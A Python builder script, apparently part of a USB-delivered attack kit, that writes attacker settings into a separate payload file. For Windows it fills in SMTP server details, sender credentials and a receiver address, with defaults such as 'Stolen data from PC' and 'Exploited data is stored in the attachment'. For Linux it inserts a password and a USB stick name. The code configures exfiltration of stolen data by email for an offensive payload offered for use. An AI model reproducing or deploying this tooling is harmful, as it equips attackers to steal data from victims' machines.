import sys

ARGS = sys.argv[1:]
SYSTEM_LIST = ["windows", "linux"]


def windows_writer():
    payload = []
    try:
        payload = open(ARGS[1], 'r').readlines()
        SMTP_SERVER = "smtp.mail.yahoo.com"
        SMTP_PORT = 587
        EMAIL_SUBJECT = "Stolen data from PC"
        EMAIL_BODY = "Exploited data is stored in the attachment."

        value = input(f"Select a SMTP server (default '{SMTP_SERVER}'): ")
        if value == "":
            value = SMTP_SERVER
        payload[30] = payload[30].replace("SMTP_SERVER", value)

        value = input(f"Select a SMTP server port (default '{SMTP_PORT}'): ")
        if value == "":
            value = SMTP_PORT
        payload[30] = payload[30].replace("SMTP_PORT", value)

        done = False
        while not done:
            value = input(f"Select a SMTP server password: ")
            if value != "":
                payload[30] = payload[30].replace("SMTP_PASSWORD", value)
                done = True

        done = False
        while not done:
            value = input(f"Select a SMTP server email: ")
            if value != "":
                payload[30] = payload[30].replace("SENDER_EMAIL", value)
                done = True

        done = False
        while not done:
            value = input(f"Select a receiver email: ")
            if value != "":
                payload[30] = payload[30].replace("RECEIVER_EMAIL", value)
                done = True

        value = input(f"Select an email subject (default '{EMAIL_SUBJECT}'): ")
        if value == "":
            value = EMAIL_SUBJECT
        payload[30] = payload[30].replace("EMAIL_SUBJECT", value)

        value = input(f"Select an email body (default '{EMAIL_BODY}'): ")
        if value == "":
            value = EMAIL_BODY
        payload[30] = payload[30].replace("EMAIL_BODY", value)
    except FileNotFoundError:
        exit(f"File '{ARGS[1]}' is missing.")

    with open(ARGS[1], 'w') as f:
        for line in payload:
            f.write(line)


def linux_writer():
    payload = []

    try:
        payload = open(ARGS[1], 'r').readlines()

        done = False
        while not done:
            value = input(f"Select you password: ")
            if value != "":
                payload[6] = payload[6].replace("PASSWORD", value)
                payload[8] = payload[8].replace("PASSWORD", value)
                done = True

        done = False
        while not done:
            value = input(f"Select you USB stick name: ")
            if value != "":
                payload[2] = payload[2].replace("USBSTICK", value)
                payload[10] = payload[10].replace("USBSTICK", value)
                done = True
    except FileNotFoundError:
        exit(f"File '{ARGS[1]}' is missing.")

    with open(ARGS[1], 'w') as f:
        for line in payload:
            f.write(line)


if not ARGS or len(ARGS) != 2 or ARGS[0] not in SYSTEM_LIST:
    exit("Unknown system argument(s) used.")

if ARGS[0] == SYSTEM_LIST[0]:
    windows_writer()
else:
    linux_writer()
